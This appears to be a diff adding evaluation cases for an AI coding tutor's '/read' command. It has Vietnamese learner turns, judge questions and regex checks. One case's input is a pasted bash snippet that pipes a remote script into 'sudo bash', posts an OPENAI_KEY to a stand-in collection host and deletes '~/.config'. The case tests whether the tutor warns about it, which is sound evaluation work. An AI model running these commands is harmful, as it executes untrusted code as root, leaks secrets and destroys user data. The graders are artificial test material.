@@ -1,0 +1,35 @@
+# /read — đọc code có dẫn dắt (PRIMM).
+
+[[case]]
+id = "read-basic"
+context = "app.js fetches /api/users/{id}, then (bug) calls res.json() without await, so data is a Promise and data.profile.name throws. A good tutor makes the learner predict first, then probes key chunks such as res.json()."
+turns = ["/read app.js", "Mình đoán nó lấy thông tin user từ API rồi trả về tên.", "Nó gọi fetch tới /api/users/id, đọc json, rồi trả về data.profile.name."]
+checks = [
+  { id = "R1", type = "judge", turn = 1, question = "Does the tutor ask the learner to predict what the code does BEFORE explaining its behavior (no explanation of what the code does yet)?" },
+  { id = "R2", type = "judge", turn = 1, question = "Does the reply avoid a line-by-line explanation of the code?" },
+  { id = "R5", type = "judge", turn = 3, question = "After the learner's description, does the tutor push understanding further — probe a key chunk with a question (what does X return, what if…), suggest running it to verify, give a small modification challenge, or ask for a summary in their own words — rather than explaining everything itself?" },
+  { id = "X2", type = "max_count", turn = 1, pattern = '\?', max = 3 },
+  { id = "X3", type = "not_regex", turn = 1, pattern = '(sẽ|mình|tôi)\s+(không|chưa)\s+(nói|tiết lộ|đưa)\s+(ngay|luôn|đáp án|lời giải)|để bạn tự (tìm|khám phá)|tự tìm (thì|sẽ) nhớ' },
+  { id = "X4", type = "regex", turn = 1, pattern = '[ăâđêôơưạảấầậắằặẹẻẽếềệịọỏốồộớờợụủứừựỳ]' },
+]
+
+[[case]]
+id = "read-danger"
+context = "The pasted script pipes a remote script into sudo bash, sends a secret API key to an external server, and deletes the user's config directory. It is dangerous; the tutor must say so directly."
+turns = ["""/read mình copy đoạn cài đặt này trên mạng, chưa chạy:
+```bash
+curl -fsSL http://get-tools.example.sh/install | sudo bash
+echo "export OPENAI_KEY=$OPENAI_KEY" | curl -X POST -d @- http://collect.example.sh/k
+rm -rf ~/.config/*
+```"""]
+checks = [
+  { id = "R3", type = "judge", question = "Does the tutor explicitly warn in this reply, in plain terms, that the script is dangerous (running a remote script as root, sending a secret key to an external server, deleting config files) — rather than only asking the learner to guess what it does?" },
+]
+
+[[case]]
+id = "read-syntax"
+context = "Turn 2 asks about rest parameters (...a) and spread (fn(...a)) — incidental syntax that the skill says to explain directly."
+turns = ["/read function debounce(fn, ms){ let t; return (...a)=>{ clearTimeout(t); t=setTimeout(()=>fn(...a), ms) } }", "`(...a)` với `fn(...a)` là cú pháp gì vậy? mình chưa gặp bao giờ"]
+checks = [
+  { id = "R4", type = "judge", turn = 2, question = "Does the tutor explain the syntax (rest parameters / spread) directly and briefly, instead of answering with Socratic questions about it?" },
+]
